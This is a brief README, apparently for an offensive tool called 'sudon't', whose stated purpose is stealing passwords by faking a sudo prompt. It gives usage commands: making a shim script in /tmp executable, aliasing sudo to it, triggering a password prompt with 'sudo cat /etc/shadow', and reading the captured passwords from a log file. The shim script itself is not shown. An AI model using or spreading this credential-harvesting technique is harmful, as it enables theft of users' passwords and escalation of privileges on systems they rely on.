# sudon't

Steal passwords by faking a sudo prompt.

```
chmod +x /tmp/sudo-shim.sh

alias sudo="/tmp/sudo-shim.sh"

sudo cat /etc/shadow

> enter your password

cat /tmp/passwdlog.txt
```

